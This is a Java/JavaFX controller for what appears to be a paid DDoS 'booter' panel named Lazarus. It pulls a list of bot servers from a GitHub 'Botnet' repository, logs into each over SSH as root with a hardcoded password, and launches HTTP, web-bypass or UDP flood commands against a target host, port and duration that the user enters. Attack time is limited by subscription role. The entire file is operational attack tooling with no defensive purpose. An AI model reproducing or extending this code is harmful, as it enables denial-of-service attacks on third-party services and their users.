import com.jcraft.jsch.Session;
import javafx.concurrent.Task;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.ComboBox;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import javafx.util.Pair;


import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.Scanner;

public class MenuController {
    public Label lblGreeting;
    public Label lblRole;
    public Label lblTime;
    public Label lblCurrent;
    public Label lblOwner;
    public Label lblDiscord;
    public Button btnLaunch;
    public TextField txtHost;
    public ComboBox<String> cmbMethods = new ComboBox<>();
    public TextField txtPort;
    public TextField txtPort1;
    public Label lblCount;
    public TextField txtPower;

    public void onActionLaunch(ActionEvent actionEvent) throws Exception {
        String method = cmbMethods.getValue();
        String host = txtHost.getText();
        String port = txtPort.getText();
        String time = txtPort1.getText();

        try{
            int tempo = Integer.parseInt(time);
            Integer.parseInt(port);
            if(!Constant.ROLE.getCurrentRole().getKey().equals("Owner")&&!Constant.ROLE.getCurrentRole().getKey().equals("Admin")){
                int comp = Integer.parseInt(Constant.ROLE.getCurrentRole().getValue());
                if(tempo>comp){
                    return;
                }
            }
            if(host.equals("")||port.equals("")||time.equals("")||method.equals("")){
                return;
            }
        }catch(Exception ignored){
            return;
        }
        List<String> server = new ArrayList<>();
        URL url = new URL("https://raw.githubusercontent.com/JonasNihal/Botnet/main/servers");
        Scanner sc = new Scanner(url.openStream());
        while(sc.hasNextLine()){
            server.add(sc.nextLine().trim());
        }
        int size=Constant.ROLE.getRankNum();
        List<String> inteiros = new ArrayList<>();

        if(size!=-1){
            int tamanho = size;
            Random rand = new Random();
            for(int i =0; i<tamanho;i++){
                rand.setSeed(System.currentTimeMillis());
                int numb = rand.nextInt(server.size());
                if(!inteiros.contains(server.get(numb))){
                    inteiros.add(server.get(numb));
                }else tamanho +=1;
            }
        }else{
            inteiros=server;
        }
        System.out.println(inteiros);
        attack(inteiros);
    }
    public void attack(List<String> server){

        Task<Void> task = new Task<Void>() {
            @Override
            public Void call(){
                String method = cmbMethods.getValue();
                String host = txtHost.getText();
                String port = txtPort.getText();
                String time = txtPort1.getText();
                String power="1";
                String powerUdp="50";
                if(Constant.ROLE.getCurrentRole().getKey().equals("Owner")){
                    power=txtPower.getText();
                }
                if(Integer.parseInt(power)>Integer.parseInt(powerUdp)){
                    powerUdp=power;
                }
                List<sshConnection> threads = new ArrayList<>();
                String pass = "Z5dqCT6Ng63x";
                String user = "root";
                String portServer = "22";
                long start = System.currentTimeMillis();
                for (String s : server) {
                    //System.out.println(s);
                    sshConnection currentConnection = new sshConnection();
                    threads.add(currentConnection);
                    currentConnection.setup(user,pass,s,portServer);
                    Session session = currentConnection.getSession();
                    sshCommand currentCommand = sshCommand.getInstance();
                    currentCommand.setup(session);
                    switch(method){
                        case "WebBypass":
                            currentCommand.sendCommand("python3 HttpBypass.py"+" "+host+" "+port+" "+time+" "+power);
                            break;
                        case "Http/s":
                            currentCommand.sendCommand("./httpflood "+host+" 600 get "+time+" nil");

                            break;
                        case "Udp":
                            currentCommand.sendCommand("python3 hello.py "+host+" -p "+port+" -t "+time+" -s "+powerUdp);
                            break;
                    }
                }
                int test = (int) (Long.parseLong(time)*1000);
                btnLaunch.setVisible(false);
                lblCount.setVisible(true);
                while(System.currentTimeMillis()-start<test){
                    //long timeCount=System.currentTimeMillis()-start;
                }
                btnLaunch.setVisible(true);
                lblCount.setVisible(false);
                for(sshConnection connection:threads){
                    connection.closeConnection();
                }
                return null;
            }
        };
        new Thread(task).start();

    }
    @FXML
    private void initialize() {
        if(Constant.ROLE.getCurrentRole().getKey().equals("Owner")){
            txtPower.setVisible(true);
        }
        lblCount.setText("Attacking...");
        Pair<String,String> pair = Constant.ROLE.getCurrentRole();
        lblGreeting.setText(" Welcome To Lazarus");
        lblCurrent.setText(" Concurrent: 1");
        lblTime.setText(" Time: "+pair.getValue());
        lblRole.setText(" "+pair.getKey());
        cmbMethods.getItems().add("WebBypass");
        cmbMethods.getItems().add("Http/s");
        cmbMethods.getItems().add("Udp");
    }
}
